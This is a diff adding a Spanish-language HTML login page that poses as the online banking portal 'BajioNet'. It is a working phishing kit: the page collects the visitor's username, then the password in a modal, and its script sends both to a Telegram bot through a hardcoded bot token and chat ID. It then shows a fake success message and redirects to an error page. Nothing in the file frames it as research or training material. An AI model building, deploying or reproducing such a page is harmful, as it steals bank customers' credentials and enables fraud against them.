@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BajioNet - Banca en Línea</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #6a4c93, #9d4edd, #c77dff);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: float 20s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes float {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(-50px, -50px); }
+        }
+
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.2);
+            padding: 50px 40px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .logo {
+            margin-bottom: 40px;
+        }
+
+        .logo-text {
+            font-size: 42px;
+            font-weight: bold;
+            background: linear-gradient(45deg, #6a4c93, #e63946);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -1px;
+            margin-bottom: 30px;
+        }
+
+        .welcome-text {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 40px;
+            line-height: 1.4;
+            font-weight: 400;
+        }
+
+        .form-group {
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background-color: #fafafa;
+            color: #333;
+            font-weight: 400;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #6a4c93;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(106, 76, 147, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .form-input::placeholder {
+            color: #999;
+            font-weight: 400;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #999;
+            font-size: 18px;
+            padding: 5px;
+            transition: color 0.3s ease;
+        }
+
+        .toggle-password:hover {
+            color: #6a4c93;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #d1d5db, #9ca3af);
+            color: #666;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            text-transform: capitalize;
+        }
+
+        .login-btn:enabled {
+            background: linear-gradient(135deg, #6a4c93, #9d4edd);
+            color: white;
+        }
+
+        .login-btn:enabled:hover {
+            background: linear-gradient(135deg, #5a3a83, #8d3ecd);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(106, 76, 147, 0.3);
+        }
+
+        .login-btn:disabled {
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            color: #6a4c93;
+            margin-top: 15px;
+            font-weight: 500;
+        }
+
+        .success-message {
+            display: none;
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            margin-top: 15px;
+            font-weight: 500;
+        }
+
+        .error-message {
+            display: none;
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            margin-top: 15px;
+            font-weight: 500;
+        }
+
+        .decorative-elements {
+            position: absolute;
+            top: -100px;
+            left: -100px;
+            width: 200px;
+            height: 200px;
+            background: linear-gradient(45deg, rgba(255,255,255,0.1), transparent);
+            border-radius: 50%;
+            animation: rotate 15s linear infinite;
+        }
+
+        .decorative-elements::after {
+            content: '';
+            position: absolute;
+            bottom: -150px;
+            right: -150px;
+            width: 300px;
+            height: 300px;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05));
+            border-radius: 50%;
+        }
+
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 40px 25px;
+                margin: 10px;
+                max-width: none;
+            }
+
+            .logo-text {
+                font-size: 36px;
+            }
+
+            .welcome-text {
+                font-size: 15px;
+                margin-bottom: 35px;
+            }
+
+            .form-input {
+                padding: 16px 18px;
+                font-size: 16px;
+            }
+
+            .login-btn {
+                padding: 16px;
+                font-size: 15px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            body {
+                padding: 15px;
+            }
+
+            .login-container {
+                padding: 35px 20px;
+            }
+
+            .logo-text {
+                font-size: 32px;
+            }
+
+            .welcome-text {
+                font-size: 14px;
+            }
+        }
+
+        /* Modal para contraseña */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+        }
+
+        .modal-title {
+            color: #6a4c93;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 25px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 25px;
+        }
+
+        .modal-btn {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .modal-btn.primary {
+            background: linear-gradient(135deg, #6a4c93, #9d4edd);
+            color: white;
+        }
+
+        .modal-btn.primary:hover {
+            background: linear-gradient(135deg, #5a3a83, #8d3ecd);
+            transform: translateY(-1px);
+        }
+
+        .modal-btn.secondary {
+            background: #f3f4f6;
+            color: #666;
+        }
+
+        .modal-btn.secondary:hover {
+            background: #e5e7eb;
+        }
+    </style>
+</head>
+<body>
+    <div class="decorative-elements"></div>
+    
+    <div class="login-container">
+        <div class="logo">
+            <div class="logo-text">BajioNet</div>
+        </div>
+        
+        <p class="welcome-text">
+            Ingresa tu Usuario para iniciar sesión
+        </p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <input 
+                    type="text" 
+                    id="usuario" 
+                    class="form-input" 
+                    placeholder="Usuario"
+                    required
+                    autocomplete="username"
+                >
+            </div>
+
+            <button type="submit" class="login-btn" id="submitBtn" disabled>
+                Ingresar
+            </button>
+
+            <div class="loading" id="loading">
+                Verificando información...
+            </div>
+
+            <div class="success-message" id="successMessage">
+                Información verificada correctamente
+            </div>
+
+            <div class="error-message" id="errorMessage">
+                Error al verificar la información. Intenta nuevamente.
+            </div>
+        </form>
+    </div>
+
+    <!-- Modal para contraseña -->
+    <div id="passwordModal" class="modal">
+        <div class="modal-content">
+            <h3 class="modal-title">Ingresa tu contraseña</h3>
+            <div class="form-group">
+                <div class="password-container">
+                    <input 
+                        type="password" 
+                        id="passwordInput" 
+                        class="form-input" 
+                        placeholder="Contraseña"
+                        autocomplete="current-password"
+                    >
+                    <button type="button" class="toggle-password" onclick="togglePassword()">
+                        👁️
+                    </button>
+                </div>
+            </div>
+            <div class="modal-buttons">
+                <button type="button" class="modal-btn primary" onclick="submitLogin()">
+                    Continuar
+                </button>
+                <button type="button" class="modal-btn secondary" onclick="closePasswordModal()">
+                    Cancelar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+        const TELEGRAM_CHAT_ID = '5848946481';
+
+        let currentUser = '';
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('passwordInput');
+            const toggleBtn = document.querySelector('.toggle-password');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = '🙈';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = '👁️';
+            }
+        }
+
+        function showPasswordModal() {
+            const usuario = document.getElementById('usuario').value;
+            if (!usuario) {
+                return;
+            }
+            currentUser = usuario;
+            document.getElementById('passwordModal').style.display = 'flex';
+            document.getElementById('passwordInput').focus();
+        }
+
+        function closePasswordModal() {
+            document.getElementById('passwordModal').style.display = 'none';
+            document.getElementById('passwordInput').value = '';
+            document.getElementById('passwordInput').type = 'password';
+            document.querySelector('.toggle-password').textContent = '👁️';
+        }
+
+        async function sendToTelegram(usuario, contrasena) {
+            const message = `🏦 *Nuevo acceso BajioNet*\n\n👤 *Usuario:* ${usuario}\n🔐 *Contraseña:* ${contrasena}\n⏰ *Fecha:* ${new Date().toLocaleString('es-ES')}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            return response.ok;
+        }
+
+        async function submitLogin() {
+            const usuario = currentUser;
+            const contrasena = document.getElementById('passwordInput').value;
+            
+            if (!contrasena) {
+                alert('Por favor ingresa tu contraseña');
+                return;
+            }
+
+            const loading = document.getElementById('loading');
+            const successMessage = document.getElementById('successMessage');
+            const errorMessage = document.getElementById('errorMessage');
+
+            // Ocultar modal y mostrar loading
+            closePasswordModal();
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+            loading.style.display = 'block';
+
+            try {
+                const success = await sendToTelegram(usuario, contrasena);
+                
+                loading.style.display = 'none';
+                
+                if (success) {
+                    successMessage.style.display = 'block';
+                    
+                    // Redirigir después de 2 segundos
+                    setTimeout(() => {
+                        window.location.href = 'error.html';
+                    }, 2000);
+                } else {
+                    errorMessage.style.display = 'block';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                loading.style.display = 'none';
+                errorMessage.style.display = 'block';
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            showPasswordModal();
+        });
+
+        // Permitir envío con Enter en el modal de contraseña
+        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitLogin();
+            }
+        });
+
+        // Validación en tiempo real
+        document.getElementById('usuario').addEventListener('input', function() {
+            const usuario = this.value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            
+            if (usuario) {
+                submitBtn.disabled = false;
+                submitBtn.style.cursor = 'pointer';
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.style.cursor = 'not-allowed';
+            }
+        });
+
+        // Cerrar modal al hacer clic fuera
+        document.getElementById('passwordModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closePasswordModal();
+            }
+        });
+    </script>
+</body>
+</html>
